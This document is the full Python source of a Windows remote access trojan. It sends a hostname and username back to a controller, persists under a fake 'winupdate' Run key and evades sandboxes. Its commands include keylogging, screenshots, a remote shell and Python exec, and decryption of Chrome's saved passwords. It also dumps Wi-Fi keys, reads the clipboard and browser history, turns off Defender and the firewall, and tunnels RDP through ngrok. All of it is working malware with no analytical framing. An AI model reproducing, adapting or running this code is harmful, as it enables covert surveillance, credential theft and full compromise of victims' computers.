import socket, os, sys, platform, time, ctypes, subprocess, threading, pynput.keyboard, wmi, json
import win32api, winerror, win32event
from shutil import copyfile
from winreg import *
from io import StringIO, BytesIO
from cryptography.fernet import Fernet
import pyscreeze
import comtypes
import win32com.client as wincl
import webbrowser
import pyautogui
import pyngrok
from pyngrok import ngrok
import browserhistory as bh
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from prettytable import PrettyTable
import win32cred
import threading
import pywintypes
import ctypes
from ctypes import *
import win32con
import sys
import winreg
import urllib, urllib3
import cv2

strHost = "127.0.0.1"
intPort = 3000

strPath = os.path.realpath(sys.argv[0])
TMP = os.environ["TEMP"]
APPDATA = os.environ["APPDATA"]
intBuff = 1024

blnMeltFile = False
blnAddToStartup = False

mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

def meltFile():
    winupdate = os.path.join(TMP, "winupdate")
    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
        try:
            os.mkdir(winupdate)
        except:
            pass
        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))

        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
        subprocess.Popen(strCommand, shell=True)
        sys.exit(0)

def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True

def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False

def startup(onstartup):
    try:
        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b"Unable to add to startup!")
    else:
        if not onstartup:
            send(b"success")

def remove_from_startup():
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b"Program is not registered in startup.")
    except WindowsError:
        send(b"Error removing value!")
    else:
        send(b"success")

def server_connect():
    global objSocket, objEncryptor
    while True:
        try:
            objSocket = socket.socket()
            objSocket.connect((strHost, intPort))
        except socket.error:
            time.sleep(5)
        else:
            break

    arrUserInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    if detectSandboxie():
        strPlatform += " (Sandboxie) "
    if detectVM():
        strPlatform += " (Virtual Machine) "
    arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrUserInfo).encode())

    objEncryptor = Fernet(objSocket.recv(intBuff))

recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))

send = lambda data: objSocket.send(objEncryptor.encrypt(data))

if blnMeltFile: meltFile()
if blnAddToStartup: startup(True)

server_connect()

def OnKeyboardEvent(event):
    global strKeyLogs

    try:
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:
        strKeyLogs += f" [{str(event)[4:]}] "
    else:
        strKeyLogs += f"{event}"[1:len(str(event)) - 1]

KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)

def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)

def MessageBox(message):
    strScript = os.path.join(TMP, "m.vbs")
    with open(strScript, "w") as objVBS:
        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

def screenshot():
    objImage = pyscreeze.screenshot()
    with BytesIO() as objBytes:
        objImage.save(objBytes, format="PNG")
        objPic = objBytes.getvalue()

    sendall(objPic)

def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()
    arrRawDrives = arrRawDrives.split("\000")[:-1]

    strDrives = ""
    for drive in arrRawDrives:
        strDrives += drive.replace("\\", "") + "\n"
    send(strDrives.encode())

    strDir = recv(intBuff).decode()

    if os.path.isdir(strDir):
        if strDir[:-1] != "\\" or strDir[:-1] != "/":
            strDir += "\\"
        arrFiles = os.listdir(strDir)

        strFiles = ""
        for file in arrFiles:
            strFiles += f"{file}\n"

        sendall(strFiles.encode())

    else:
        send(b"Invalid Directory!")
        return

def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(intBuff).decode()

    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        send(b"Done!")
    except:
        send(b"Path is protected/invalid!")

def receive(data):
    if not os.path.isfile(data):
        send(b"Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())

def lock():
    ctypes.windll.user32.LockWorkStation()

def shutdown(shutdowntype):
    command = f"shutdown {shutdowntype} -f -t 30"
    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    objSocket.close()
    sys.exit(0)

def command_shell():
    strCurrentDir = os.getcwd()
    send(os.getcwdb())
    bytData = b""

    while True:
        strData = recv(intBuff).decode()

        if strData == "goback":
            os.chdir(strCurrentDir)
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if objCommand.stderr.read().decode() == "":
                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]
                os.chdir(strOutput)

                bytData = f"\n{os.getcwd()}>".encode()

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytData = (strOutput + b"\n" + os.getcwdb() + b">")
        else:
            bytData = b"Error!"

        sendall(bytData)

def python_interpreter():
    send(b"received")
    while True:
        strCommand = recv(intBuff).decode()
        if strCommand == "exit":
            send(b"exiting")
            break
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        try:
            exec(strCommand)
            print()
            strError = None
        except Exception as e:
            strError = f"{e.__class__.__name__}: "
            try:
                strError += f"{e.args[0]}"
            except:
                pass
        finally:
            sys.stdout = old_stdout

        if strError:
            sendall(strError.encode())
        else:
            sendall(redirected_output.getvalue().encode())

def vbs_block_process(process, popup=False):
    strVBSCode = "On Error Resume Next\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                 f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                 "objLatestProcess.TargetInstance.Terminate\n"
    if popup:
        strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

    strVBSCode += "End If\nLoop"

    strScript = os.path.join(TMP, "d.vbs")

    with open(strScript, "w") as objVBSFile:
        objVBSFile.write(strVBSCode)

    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

def disable_taskmgr():
    global blnDisabled
    if not blnDisabled:
        send(b"Enabling ...")

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

        blnDisabled = True
    else:
        send(b"Disabling ...")

        popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

        vbs_block_process("taskmgr.exe", popup=popup)
        blnDisabled = False

def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            send(b"success")
        else:
            send(b"error")

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)
            strKeyLogs = ""
            send(b"success")
        else:
            send(b"error")

    elif option == "dump":
        if not KeyListener.running:
            send(b"error")
        else:
            if strKeyLogs == "":
                send(b"error2")
            else:
                time.sleep(0.2)
                sendall(strKeyLogs.encode())
                strKeyLogs = ""

def run_command(command):
    bytLogOutput = b"\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
    else:
        bytLogOutput += b"Error!"

    sendall(bytLogOutput)

def voicela(message: str):
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak(message)
    comtypes.CoUninitialize()

def openweb(link: str):
    webbrowser.open(link)

def write(message: str):
    if message.lower() == "enter":
        pyautogui.press("enter")
    elif message.lower() == "tab":
        pyautogui.press("tab")
    else:
        pyautogui.typewrite(message)
        pyautogui.press('enter')

def wallpapah(directory: str):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, directory, 0)

def block():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        ok = ctypes.windll.user32.BlockInput(True)
        send(b"True")
    else:
        send(b"False")
def unblock():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        ok = ctypes.windll.user32.BlockInput(False)
        send(b"True")
    else:
        send(b"False")

def rdp(num: str):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        if num == "0":
            os.popen('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
            send(b"stopped")
        else:
            os.popen('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
            os.popen("netsh advfirewall firewall set rule group='remote desktop' new enable=Yes")
            public_url = ngrok.connect(3389)
            rdp = ngrok.connect(3389, "tcp")
            tunnels = ngrok.get_tunnels()
            send(str(tunnels).encode("utf_8"))
    else:
        send(b"fail")

def disableav():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .sys", shell=True)
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .bat", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
        subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)
        send(b"ok")
    else:
        send(b"fail")

def enableav():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .exe", shell=True)
        subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .sys", shell=True)
        subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .bat", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Enabled", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection enable", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $false", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $false", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $false", shell=True)
        subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state on", shell=True)
        send(b"ok")
    else:
        send(b"fail")

def history():
    try:
        os.system("TASKKILL /F /IM chrome.exe")
    except:
        pass
    dict_obj = bh.get_browserhistory()
    strobj = str(dict_obj)
    send(str(strobj).encode("utf_8"))

def clipboard():
    CF_TEXT = 1
    kernel32 = ctypes.windll.kernel32
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32 = ctypes.windll.user32
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    if user32.IsClipboardFormatAvailable(CF_TEXT):
        data = user32.GetClipboardData(CF_TEXT)
        data_locked = kernel32.GlobalLock(data)
        text = ctypes.c_char_p(data_locked)
        value = text.value
        kernel32.GlobalUnlock(data_locked)
        body = str(value)
        user32.CloseClipboard()
        send(body.encode("utf_8"))

def chromepass():
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    xxx = PrettyTable()
    xxx.field_names = ["URL", "Username", "Password"]
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            xxx.add_row([url, username, decrypted_password])
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    send(str(xxx).encode("utf_8"))
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass

def wifipass():
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    data = meta_data.decode('utf-8', errors ="backslashreplace")
    data = data.split('\n')
    profiles = []
    vv = ""
    for i in data:
        if "All User Profile" in i :
            i = i.split(":")
            i = i[1]
            i = i[1:-1]
            profiles.append(i)   
    vv += "{:<30}| {:<}".format("Wi-Fi Name", "Password")
    vv += "----------------------------------------------"
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key = clear'])
            results = results.decode('utf-8', errors ="backslashreplace")
            results = results.split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                vv += "{:<30}| {:<}".format(i, results[0])
            except IndexError:
                vv += "{:<30}| {:<}".format(i, "")
        except subprocess.CalledProcessError:
            pass
    send(str(vv).encode("utf_8"))

def idletime():
    class LASTINPUTINFO(Structure):
            _fields_ = [
            ('cbSize', c_uint),
            ('dwTime', c_int),
        ]

    def get_idle_duration():
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = sizeof(lastInputInfo)
        if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
            millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
            return millis / 1000.0
        else:
            return 0
    global idle1
    idle1 = threading.Thread(target=get_idle_duration)
    idle1._running = True
    idle1.daemon = True
    idle1.start()
    duration = get_idle_duration()
    send(str(duration).encode("utf_8"))

def geolocat():
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        lol = str(data)
        lat = lol[112:]
        sep = ','
        restlat = lat.split(sep, 1)[0]
        longg = lol[134:]
        restlong = longg.split(sep, 1)[0]
        link = "http://www.google.com/maps/place/" + restlat + "," + restlong
        send(link.encode("utf_8"))

while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = strData.decode()

            if strData == "exit":
                objSocket.close()
                sys.exit(0)
            elif strData[:3] == "msg":
                MessageBox(strData[3:])
            elif strData == "startup":
                startup(False)
            elif strData == "blockinp":
                block()
            elif strData == "unblockinp":
                unblock()
            elif strData == "rmvstartup":
                remove_from_startup()
            elif strData == "screen":
                screenshot()
            elif "voiceover" in strData:
                x = str(strData).split(":")
                voicela(x[1])
            elif "write" in strData:
                x = str(strData).split(":")
                write(x[1])
            elif "wallpaper" in strData:
                x = str(strData).split(":")
                wallpapah(x[1])
            elif "opsite" in strData:
                x = str(strData).split(":")
                openweb(x[1])
            elif "history" in strData:
                history()
            elif strData == "clipboard":
                clipboard()
            elif strData == "idletime":
                idletime()
            elif strData == "filebrowser":
                file_browser()
            elif strData[:4] == "send":
                upload(strData[4:])
            elif strData[:4] == "recv":
                receive(strData[4:])
            elif strData == "lock":
                lock()
            elif strData == "shutdown":
                shutdown("-s")
            elif strData == "restart":
                shutdown("-r")
            elif strData == "test":
                continue
            elif strData == "avoff":
                disableav()
            elif strData == "avon":
                enableav()
            elif strData == "chromepass":
                chromepass()
            elif strData == "wifipass":
                wifipass()
            elif strData == "cmd":
                command_shell()
            elif strData == "python":
                python_interpreter()
            elif strData == "geolocat":
                geolocat()
            elif strData == "keystart":
                keylogger("start")
            elif strData == "keystop":
                keylogger("stop")
            elif strData == "keydump":
                keylogger("dump")
            elif strData[:6] == "runcmd":
                run_command(strData[6:])
            elif strData == "dtaskmgr":
                if not "blnDisabled" in globals():
                    blnDisabled = True
                disable_taskmgr()
    except socket.error:
        objSocket.close()
        del objSocket
        server_connect()